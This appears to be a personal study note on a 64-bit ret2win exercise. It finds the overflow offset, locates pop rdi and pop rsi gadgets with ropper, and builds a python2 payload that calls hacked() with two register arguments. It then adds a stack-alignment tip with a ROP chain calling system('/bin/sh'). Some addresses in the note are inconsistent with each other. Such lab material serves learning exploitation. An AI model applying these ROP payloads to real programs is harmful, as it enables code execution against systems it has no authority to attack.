ret2win with params for 64 bit architechture

ret2win_params: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c9ab2d6786356596c407f942908f9078b156d4d1, for GNU/Linux 3.2.0, not stripped

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments

# gcc ret2win_params.c -o ret2win_params -fno-stack-protector -z execstack -no-pie

compiled without the m32 option

in 32 bit, 0xdeadbeef was on stack at ebp - 8
in 64 bit , 

   0x000000000040114e <+8>:	mov    QWORD PTR [rbp-0x8],rdi
   0x0000000000401152 <+12>:	mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000401156 <+16>:	movabs rax,0xdeadbeefdeadbeef
   0x0000000000401160 <+26>:	cmp    QWORD PTR [rbp-0x8],rax
   0x0000000000401164 <+30>:	jne    0x401187 <hacked+65>
   0x0000000000401166 <+32>:	movabs rax,0xc0debabec0debabe
   0x0000000000401170 <+42>:	cmp    QWORD PTR [rbp-0x10],rax

we need to put return addrss of hacked() and we need to put the required values into the rdi and rsi registers
coz values of those registers put into rbp/ebp then compared with required value

in 64 bit, if we give it an invalid addrss, it wont even populate the RIP, so when we send cyclic 100 it doset show up in the RIP

*RSP  0x7fffffffdb68 ◂— 'daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
*RIP  0x4011e9 (register_name+79) ◂— ret 

so if want to get the offset, take the values of RSP first 4/8 bytes both work
lets take 8 bytes so daaaaaaa in this case

# cyclic -l 
Found at offset 24

so anything after 24 bytes will enter the RIP

get Return addrss of hacked() from # disassemble hacked or # info functions , #readelf -s ret2win_params

0x0000000000401146 
0x0000000000401146    <+0>:	push   rbp  : this is the output of disassemble

******************************************************************

padding + pop rdi + param1 + pop rsi;pop r15 + param2 + junk value for r15 + hacked function address

******************************************************************

first we need to put values in register then call hacked function


to find rdi and rsi, we can use ropper

# ropper --file ret2win_params
# ropper --file ret2win_params --search "pop rdi"

**** dont recompile the binary, since gcc has updated, we dont get addrss of "pop rdi" from ropper

0x000000000040124b: pop rdi; ret; 


# ropper --file ret2win_params --search "pop rsi"
0x0000000000401249: pop rsi; pop r15; ret; 

and we dont have pop rsi we have pop rsi;pop r15
so we need to put another junk value after param2

*******
so instead of overflowing return address with the addrss of hacked() we are gonna overflow with pop rdi command gadget to pop first param1 into the rdi then pop rsi to pop param2 into rsi then pop junk into r15 then with all parameters in place we are gonna call hacked
*******

# python2 -c "print 'A'*24 + '\x4b\x12\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\x49\x12\x40\x00\x00\x00\x00\x00'  + '\xbe\xba\xde\xc0\xbe\xba\xde\xc0' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x42\x11\x40\x00\x00\x00\x00\x00'  " > payload


***********

For 32 bit, we dont have to do pop operations to put values into registers
For 64 bit , we do have to do it in order for functions to be called

----------------------------------------------------------------------------------------------

A small issue you may get when pwning on 64-bit systems is that your exploit works perfectly locally but fails remotely - or even fails when you try to use the provided LIBC version rather than your local one. This arises due to something called stack alignment

 if the stack is not 16-byte aligned - that is, RSP is not a multiple of 16 - the ROP chain will fail on systems
   ----------------
The fix is simple - in your ROP chain, before the call to system, place a singular ret gadget:
   ----------------
# ropper --file binary --search "ret"

payload = flat({
    offset: [
        pop_rdi,
        bin_sh,
        ret,
        system_addr
    ]
})

This works because it will cause RSP to be popped an additional time, pushing it forward by 8 bytes and aligning it.

   0x000000000040114a <+8>:     mov    QWORD PTR [rbp-0x8],rdi
   0x000000000040114e <+12>:    mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000401152 <+16>:    movabs rax,0xdeadbeefdeadbeef
   0x000000000040115c <+26>:    cmp    QWORD PTR [rbp-0x8],rax
   0x0000000000401160 <+30>:    jne    0x401180 <hacked+62>
   0x0000000000401162 <+32>:    movabs rax,0xc0debabec0debabe
   0x000000000040116c <+42>:    cmp    QWORD PTR [rbp-0x10],rax

Here we can see that the parameters are taken from the register and not the stack, this is a fundamental difference between passing parameters to a function in a 32 bit and 64 bit binary
